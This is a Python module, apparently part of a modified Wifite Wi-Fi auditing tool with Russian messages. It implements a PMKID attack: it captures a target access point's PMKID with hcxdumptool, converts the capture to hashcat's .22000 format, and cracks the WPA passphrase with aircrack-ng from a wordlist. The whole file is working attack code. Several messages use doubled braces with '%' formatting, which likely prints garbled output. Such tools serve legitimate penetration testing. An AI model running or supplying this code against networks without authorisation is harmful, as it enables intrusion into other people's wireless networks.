#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..util.color import Color
from ..config import Configuration
from ..tools.aircrack import Aircrack
import os
import re
import time
import subprocess

class AttackPMKID(Attack):
    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.hash_file = Configuration.temp('pmkid.22000')
        self.success = False
        self.timer = None

    @staticmethod
    def get_existing_pmkid_file(bssid):
        """
        Ищет и возвращает путь к существующему файлу PMKID в формате hashcat (.22000).
        """
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None
        bssid = bssid.lower().replace(':', '')
        file_re = re.compile(r'.*pmkid_.*\.22000')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue
            with open(pmkid_filename, 'r') as pmkid_handle:
                pmkid_hash = pmkid_handle.read().strip()
                if pmkid_hash.count('*') < 3:
                    continue
                existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                if existing_bssid == bssid:
                    return pmkid_filename
        return None

    def run_aircrack(self):
        """
        Основной метод для выполнения PMKID-атаки: поиск, захват, конвертация и взлом.
        """
        if Configuration.dont_use_pmkid:
            self.success = False
            return False

        pmkid_hash_file = None
        # 1. Ищем существующий PMKID
        if not Configuration.ignore_old_handshakes:
            pmkid_hash_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_hash_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              'Загружен {C}существующий{W} PMKID hash: {C}%s{W}\n' % pmkid_hash_file)
        
        # 2. Если нет — пробуем захватить новый
        if pmkid_hash_file is None:
            pmkid_hash_file = self.capture_pmkid()
        
        if pmkid_hash_file is None or not os.path.isfile(pmkid_hash_file) or os.path.getsize(pmkid_hash_file) == 0:
            Color.pl('{!} Хэш PMKID не найден или файл пустой. Невозможно продолжить взлом.')
            self.success = False
            return False

        # 3. Если есть опция skip_crack — выходим
        if Configuration.skip_crack:
            Color.pl('{+} Подбор PMKID пропущен из-за {C}skip-crack{W}')
            self.success = False
            return True

        # 4. Пытаемся подобрать пароль через aircrack-ng
        Color.pl('{{+}} {{C}}Wifite{{W}}: Запускаем взлом PMKID с {{G}}aircrack-ng{{W}}') # Экранированные скобки

        wordlist_path = Configuration.wordlist

        if not os.path.exists(wordlist_path):
            Color.pl('{{!}} {{R}}Ошибка: Список слов не найден по пути {{C}}%s{{W}}' % wordlist_path) # Экранированные скобки
            self.success = False
            return False

        # Вызываем статический метод crack_pmkid из Aircrack
        cracked_key = Aircrack.crack_pmkid(pmkid_hash_file, wordlist=wordlist_path, verbose=True)
        
        if cracked_key:
            Color.pl('{{+}} Ключ найден: {{G}}%s{{W}}' % cracked_key) # Экранированные скобки
            from ..model.pmkid_result import CrackResultPMKID
            result = CrackResultPMKID(self.target.bssid, self.target.essid, pmkid_hash_file, cracked_key)
            result.save()
            self.crack_result = result
            self.success = True
            return True
        else:
            Color.pl('{{!}} Ключ не найден в файле PMKID. Переходим к попытке захвата handshake.') # Экранированные скобки
            self.success = False
            return False

    def capture_pmkid(self):
        """
        Запускает hcxdumptool для захвата PMKID и hcxpcapngtool для конвертации в формат .22000.
        Возвращает путь к файлу .22000, если успешно, иначе None.
        """
        iface = Configuration.interface
        bssid = self.target.bssid
        Color.pl(f'{{+}} Захват PMKID через hcxdumptool на интерфейсе {{C}}{iface}{{W}}...') # Экранированные скобки
        try:
            cmd = [
                'timeout', str(Configuration.pmkid_timeout), 'hcxdumptool',
                '-i', iface,
                '-o', self.pcapng_file,
                '--enable_status=1',
                '--filterlist_ap=%s' % bssid,
                '--mac_ap=%s' % bssid,
                '--mac_client=%s' % 'FF:FF:FF:FF:FF:FF',
                '--use_interface_filter'
            ]
            Color.pl('{{+}} Запуск: {{C}}%s{{W}}' % ' '.join(cmd)) # Экранированные скобки
            process = subprocess.run(cmd, capture_output=True, text=True)
            if process.returncode != 0 and process.returncode != 124:
                Color.pl('{{!}} hcxdumptool завершился с ошибкой: {{R}}%s{{W}}' % process.stderr.strip()) # Экранированные скобки
                return None
        except Exception as e:
            Color.pl('{{!}} Ошибка запуска hcxdumptool: {{R}}%s{{W}}' % e) # Экранированные скобки
            return None

        try:
            if not os.path.exists(self.pcapng_file) or os.path.getsize(self.pcapng_file) == 0:
                Color.pl('{{!}} Файл .pcapng пуст или не создан.') # Экранированные скобки
                return None

            cmd_hash = [
                'hcxpcapngtool',
                '-o', self.hash_file,
                self.pcapng_file
            ]
            Color.pl('{{+}} Конвертация: {{C}}%s{{W}}' % ' '.join(cmd_hash)) # Экранированные скобки
            subprocess.run(cmd_hash, check=True)
        except Exception as e:
            Color.pl('{{!}} Ошибка конвертации через hcxpcapngtool: {{R}}%s{{W}}' % e) # Экранированные скобки
            return None

        if os.path.exists(self.hash_file) and os.path.getsize(self.hash_file) > 0:
            Color.pl('{{+}} Получен PMKID hash: {{G}}%s{{W}}' % self.hash_file) # Экранированные скобки
            return self.hash_file
        else:
            Color.pl('{{!}} PMKID hash не получен после конвертации.') # Экранированные скобки
            return None

    def run(self):
        result = self.run_aircrack() 
        self.target.cracked = self.success
        return result
